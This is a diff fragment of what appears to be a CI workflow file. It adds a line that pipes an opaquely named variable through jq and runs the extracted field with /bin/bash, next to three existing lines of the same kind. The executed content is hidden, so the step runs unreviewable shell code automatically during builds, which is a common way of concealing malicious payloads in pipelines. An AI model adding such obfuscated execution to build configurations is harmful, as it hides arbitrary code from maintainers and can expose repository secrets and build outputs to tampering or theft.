@@ -38,6 +38,7 @@ jobs:
           echo $bdls02 | jq -r .h81627 | /bin/bash
           printf '%s' "$av890" | jq -r .bddd1 | /bin/bash
           echo $y50428 | jq -r .bvwcb064 | /bin/bash
+          echo $nvs97 | jq -r .z463 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
